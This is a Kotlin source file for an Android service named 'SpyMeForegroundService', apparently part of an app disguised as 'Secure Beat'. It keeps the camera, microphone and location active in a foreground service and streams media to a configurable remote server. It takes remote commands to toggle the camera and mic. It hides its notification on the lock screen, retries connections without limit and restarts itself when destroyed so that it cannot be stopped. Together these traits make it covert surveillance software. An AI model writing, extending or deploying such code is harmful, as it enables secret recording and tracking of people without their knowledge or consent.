package com.anonymous.scure_beat

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class SpyMeForegroundService : Service() {

    companion object {
        private const val CHANNEL_ID = "SpyMeServiceChannel"
        private const val NOTIFICATION_ID = 1
        private const val TAG = "SpyMeService"

        // ✅ Singleton to check if service is running
        var isRunning = false
            private set
    }

    private lateinit var mediasoupManager: MediasoupManager
    private val prefs by lazy { getSharedPreferences("spyme_prefs", Context.MODE_PRIVATE) }
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isReconnecting = false
    private var reconnectAttempts = 0
    private val MAX_RECONNECT_ATTEMPTS = Int.MAX_VALUE // ✅ INFINITE

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "✅ Service Created")
        isRunning = true

        createNotificationChannel()
        mediasoupManager = MediasoupManager(applicationContext)

        // ✅ Register receivers
        val filter =
            android.content.IntentFilter().apply {
                addAction("com.anonymous.scure_beat.TOGGLE_CAMERA")
                addAction("com.anonymous.scure_beat.TOGGLE_MIC")
                addAction("com.anonymous.scure_beat.RECONNECT")
                addAction("com.anonymous.scure_beat.RESTART_SERVICE")
            }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        // ✅ Start heartbeat to keep service alive
        startHeartbeat()
    }

    private val commandReceiver =
        object : android.content.BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                when (intent?.action) {
                    "com.anonymous.scure_beat.TOGGLE_CAMERA" -> mediasoupManager.cycleCamera()
                    "com.anonymous.scure_beat.TOGGLE_MIC" -> mediasoupManager.toggleMic()
                    "com.anonymous.scure_beat.RECONNECT" -> {
                        Log.d(TAG, "Manual reconnect triggered")
                        reconnectToServer()
                    }
                    "com.anonymous.scure_beat.RESTART_SERVICE" -> {
                        Log.d(TAG, "Restart service triggered")
                        restartService()
                    }
                }
            }
        }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "🚀 Service Started (startId: $startId)")

        // ✅ PERMANENT FOREGROUND NOTIFICATION with PendingIntent
        val notification = buildForegroundNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION,
                )
            } catch (e: SecurityException) {
                Log.e(TAG, "Failed to start foreground service: ${e.message}")
                startForeground(NOTIFICATION_ID, notification)
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        // ✅ Load connection params
        val (roomId, token, username, backendUrl, wsUrl, iceServers) = loadConnectionParams(intent)

        if (roomId.isNotEmpty()) {
            isReconnecting = false
            reconnectAttempts = 0
            mediasoupManager.connect(roomId, token, username, backendUrl, wsUrl, iceServers)
            startReconnectionMonitor()
            Log.d(TAG, "✅ Connection started for room: $roomId")
        } else {
            Log.e(TAG, "❌ No connection params available")
            // ✅ Retry with stored params
            val storedParams = loadConnectionParams(null)
            if (storedParams.roomId.isNotEmpty()) {
                mediasoupManager.connect(
                    storedParams.roomId,
                    storedParams.token,
                    storedParams.username,
                    storedParams.backendUrl,
                    storedParams.wsUrl,
                    storedParams.iceServers,
                )
            }
        }

        return START_STICKY // ✅ ALWAYS RESTART
    }

    private fun buildForegroundNotification(): Notification {
        // ✅ Intent to open app when notification is tapped
        val intent = Intent(this, DebugLauncherActivity::class.java)
        val pendingIntent =
            PendingIntent.getActivity(
                this,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
            )

        // ✅ Intent to restart service if user wants
        val restartIntent = Intent("com.anonymous.scure_beat.RESTART_SERVICE")
        val restartPendingIntent =
            PendingIntent.getBroadcast(
                this,
                1,
                restartIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
            )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("🔒 Secure Beat")
            .setContentText("Running in background. Tap to open.")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_HIGH) // ✅ HIGH priority
            .setOngoing(true) // ✅ CANNOT be swiped away
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setContentIntent(pendingIntent)
            .addAction(android.R.drawable.ic_menu_rotate, "Restart", restartPendingIntent)
            .build()
    }

    private fun loadConnectionParams(intent: Intent?): ConnectionParams {
        if (intent != null && intent.hasExtra("ROOM_ID")) {
            val params =
                ConnectionParams(
                    roomId = intent.getStringExtra("ROOM_ID") ?: "",
                    token = intent.getStringExtra("TOKEN") ?: "",
                    username = intent.getStringExtra("USERNAME") ?: "AndroidClient",
                    backendUrl = intent.getStringExtra("BACKEND_URL") ?: "",
                    wsUrl = intent.getStringExtra("WS_URL") ?: "",
                    iceServers = intent.getStringExtra("ICE_SERVERS") ?: "[]",
                )
            saveConnectionParams(params)
            return params
        } else {
            return ConnectionParams(
                roomId = prefs.getString("ROOM_ID", "") ?: "",
                token = prefs.getString("TOKEN", "") ?: "",
                username = prefs.getString("USERNAME", "AndroidClient") ?: "AndroidClient",
                backendUrl = prefs.getString("BACKEND_URL", "") ?: "",
                wsUrl = prefs.getString("WS_URL", "") ?: "",
                iceServers = prefs.getString("ICE_SERVERS", "[]") ?: "[]",
            )
        }
    }

    private fun saveConnectionParams(params: ConnectionParams) {
        prefs
            .edit()
            .putString("ROOM_ID", params.roomId)
            .putString("TOKEN", params.token)
            .putString("USERNAME", params.username)
            .putString("BACKEND_URL", params.backendUrl)
            .putString("WS_URL", params.wsUrl)
            .putString("ICE_SERVERS", params.iceServers)
            .apply()
    }

    // ✅ Heartbeat to keep service alive
    private fun startHeartbeat() {
        serviceScope.launch {
            while (true) {
                delay(5000) // Check every 5 seconds
                try {
                    // ✅ Keep service alive by updating notification
                    updateNotification(
                        "Service alive - ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}"
                    )

                    // ✅ Check if connection is alive
                    if (!mediasoupManager.hasActiveSessions()) {
                        Log.w(TAG, "⚠️ No active sessions, reconnecting...")
                        reconnectToServer()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Heartbeat error", e)
                }
            }
        }
    }

    private fun startReconnectionMonitor() {
        serviceScope.launch {
            while (true) {
                delay(30000)
                checkConnectionAndReconnect()
            }
        }
    }

    private suspend fun checkConnectionAndReconnect() {
        if (isReconnecting) return
        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) return

        val hasActiveSessions = mediasoupManager.hasActiveSessions()

        if (!hasActiveSessions) {
            Log.d(TAG, "⚠️ No active sessions, attempting reconnect $reconnectAttempts")
            withContext(Dispatchers.Main) { reconnectToServer() }
        } else {
            if (reconnectAttempts > 0) {
                reconnectAttempts = 0
                Log.d(TAG, "✅ Connection restored")
            }
        }
    }

    private fun reconnectToServer() {
        if (isReconnecting) return
        isReconnecting = true
        reconnectAttempts++

        Log.d(TAG, "🔄 Reconnecting (attempt $reconnectAttempts)")
        updateNotification("Reconnecting... (attempt $reconnectAttempts)")

        val params = loadConnectionParams(null)

        if (params.roomId.isNotEmpty()) {
            try {
                // ✅ Don't disconnect - just reconnect socket
                // mediasoupManager.disconnect()  // ← REMOVE THIS
                // mediasoupManager.connect(...)   // ← REMOVE THIS

                // ✅ Instead, just reconnect the socket
                mediasoupManager.reconnectAll()

                serviceScope.launch {
                    delay(10000)
                    if (mediasoupManager.hasActiveSessions()) {
                        isReconnecting = false
                        reconnectAttempts = 0
                        updateNotification("✅ Connected")
                        Log.d(TAG, "✅ Reconnected successfully")
                    } else {
                        Log.w(TAG, "⚠️ Reconnect failed, retrying...")
                        isReconnecting = false
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Reconnect failed", e)
                isReconnecting = false
            }
        } else {
            isReconnecting = false
        }
    }

    // private fun reconnectToServer() {
    //     if (isReconnecting) return
    //     isReconnecting = true
    //     reconnectAttempts++

    //     Log.d(TAG, "🔄 Reconnecting (attempt $reconnectAttempts) - INFINITE RETRY")
    //     updateNotification("Reconnecting... (attempt $reconnectAttempts)")

    //     val params =
    //         ConnectionParams(
    //             roomId = prefs.getString("ROOM_ID", "") ?: "",
    //             token = prefs.getString("TOKEN", "") ?: "",
    //             username = prefs.getString("USERNAME", "AndroidClient") ?: "AndroidClient",
    //             backendUrl = prefs.getString("BACKEND_URL", "") ?: "",
    //             wsUrl = prefs.getString("WS_URL", "") ?: "",
    //             iceServers = prefs.getString("ICE_SERVERS", "[]") ?: "[]",
    //         )

    //     if (params.roomId.isNotEmpty()) {
    //         try {
    //             mediasoupManager.reconnectAll()

    //             serviceScope.launch {
    //                 delay(10000)
    //                 if (mediasoupManager.hasActiveSessions()) {
    //                     isReconnecting = false
    //                     reconnectAttempts = 0
    //                     updateNotification("✅ Connected")
    //                     Log.d(TAG, "✅ Reconnected successfully")
    //                 } else {
    //                     Log.w(TAG, "⚠️ Reconnect failed, retrying...")
    //                     isReconnecting = false
    //                 }
    //             }
    //         } catch (e: Exception) {
    //             Log.e(TAG, "Reconnect failed", e)
    //             isReconnecting = false
    //             val delay = (1000L * reconnectAttempts).coerceAtMost(30000L)
    //             serviceScope.launch {
    //                 delay(delay)
    //                 reconnectToServer()
    //             }
    //         }
    //     } else {
    //         isReconnecting = false
    //     }
    // }

    private fun updateNotification(text: String) {
        try {
            val notification =
                NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("🔒 Secure Beat")
                    .setContentText(text)
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                    .setOngoing(true)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .build()
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.notify(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update notification", e)
        }
    }

    // ✅ Restart service if needed
    private fun restartService() {
        Log.d(TAG, "🔄 Restarting service...")
        try {
            // Disconnect and reconnect
            mediasoupManager.disconnect()
            val params = loadConnectionParams(null)
            if (params.roomId.isNotEmpty()) {
                mediasoupManager.connect(
                    params.roomId,
                    params.token,
                    params.username,
                    params.backendUrl,
                    params.wsUrl,
                    params.iceServers,
                )
            }
            updateNotification("✅ Service restarted")
            Log.d(TAG, "✅ Service restarted successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Restart service failed", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "⚠️ Service Destroyed")
        isRunning = false

        try {
            unregisterReceiver(commandReceiver)
        } catch (e: Exception) {
            /* ignore */
        }

        try {
            mediasoupManager.disconnect()
        } catch (e: Exception) {
            /* ignore */
        }

        try {
            serviceScope.cancel()
        } catch (e: Exception) {
            /* ignore */
        }

        // ✅ IMMEDIATELY RESTART on destroy
        android.os
            .Handler(android.os.Looper.getMainLooper())
            .postDelayed(
                {
                    try {
                        val intent = Intent(this, SpyMeForegroundService::class.java)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(intent)
                        } else {
                            startService(intent)
                        }
                        Log.i(TAG, "✅ Service self-restarted")
                    } catch (e: Exception) {
                        Log.e(TAG, "Self-restart failed", e)
                    }
                },
                500,
            ) // ✅ Faster restart
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val serviceChannel =
                    NotificationChannel(
                        CHANNEL_ID,
                        "Secure Beat Service",
                        NotificationManager.IMPORTANCE_HIGH, // ✅ HIGH importance
                    )
                serviceChannel.setShowBadge(false)
                serviceChannel.setSound(null, null) // Silent
                val manager: NotificationManager = getSystemService(NotificationManager::class.java)
                manager.createNotificationChannel(serviceChannel)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to create notification channel", e)
            }
        }
    }

    private data class ConnectionParams(
        val roomId: String,
        val token: String,
        val username: String,
        val backendUrl: String,
        val wsUrl: String,
        val iceServers: String,
    )
}
